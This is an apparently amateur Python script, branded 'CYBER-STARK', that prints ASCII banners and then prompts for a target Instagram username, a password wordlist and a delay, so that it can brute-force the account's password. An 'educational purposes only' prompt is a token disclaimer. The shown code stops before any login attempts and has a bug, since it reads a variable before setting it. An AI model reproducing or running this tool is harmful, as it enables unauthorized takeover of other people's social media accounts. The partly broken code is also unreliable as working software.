#© CYBER-STARK



import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
os.system("clear")

print("\t  \033[92m.########.##.....##..#######..####\t")
print("\t  ......##..##.....##.##.....##..##.\t")
print("\t  .....##...##.....##.##.....##..##.\t")
print("\t  ....##....#########.##.....##..##.\t")
print("\t  ...##.....##.....##.##.....##..##.                         ..##......##.....##.##.....##..##.\t")
print("\t  .########.##.....##..#######..####\t")
print("")
print("\t \33[94m⊰᯽⊱┈──╌❊ CODED BY S74RK ❊╌──┈⊰᯽⊱ \t")

print("\t  \033[36m┏━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┓\t")
print("\n\t   \033[93m[•] \033[94mAUTHOR   :  \033[92mCYB3R-$74RK                                                           \t ")
print("\t  \033[93m [•] \033[94mGITHUB  : \033[92mgithub.com/CYBER-STARK                                                         \t  ")
print("\t  \033[93m [•] \033[94mINSTA  : \033[92mcyber_st4rk                                                           \t")
print("\t  \033[36m┗━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┛\t")
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
def start():
	
#there educational persposes
#and banner 
    
         sceltadisc = input("\033[93m\033[1m\n\n[!]Use this program  for educational purposes only? [y/n]: ")
         
         if sceltadisc == "y":
             print("\n")
             os.system("clear")
             print("\t  \033[92m.########.##.....##..#######..####\t")
             print("\t  ......##..##.....##.##.....##..##.\t")
             print("\t  .....##...##.....##.##.....##..##.\t")
             print("\t  ....##....#########.##.....##..##.\t")
             print("\t  ...##.....##.....##.##.....##..##.                         ..##......##.....##.##.....##..##.\t")
             print("\t  .########.##.....##..#######..####\t")
             print("")
             print("\t \33[94m⊰᯽⊱┈──╌❊ CODED BY S74RK ❊╌──┈⊰᯽⊱ \t")
             print("")
             print("\t  \033[36m┏━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┓\t")
             print("\n\t   \033[93m[•] \033[94mAUTHOR   :  \033[92mCYB3R-$74RK                                                           \t ")
             print("\t  \033[93m [•] \033[94mGITHUB  : \033[92mgithub.com/CYBER-STARK                                                         \t  ")
             print("\t  \033[93m [•] \033[94mINSTA  : \033[92mcyber_st4rk                                                           \t")
             print("\t  \033[36m┗━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┛\t")
         else:
             	     os.system("xdg-open 'https://instagram.com/mr_lalu_1232/")
             	     os.system("clear")
             	     print("\t  [#] Insta cyber_st4rk\t")
             	     print("\t  [•]Whatsapp : S74RK\t")
             	     
             	     exit()
             	     

def acquisizione():
    while True:
        if veri_break == "si":
            break
        USER = ""
        USER = input('\033[1m\033[92m[?]ENTER INSTAGRAM USERNAME FOR CRACK PASSWORD: ')
        wl = input("[?]Enter the PassList along The Path: ")
        sleepp = int(input("\033[1m\033[91m\n[!]Type the sleep time for login(sec) (Rec:900): "))
        while True:
            sub.call("clear")
            procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
            if procedere == "y":
                veri_break = "si"
                break
            elif procedere == "modify":
                print("\nReturn...")
                break
            elif procedere == "break":
                exit()
            else:
                pass
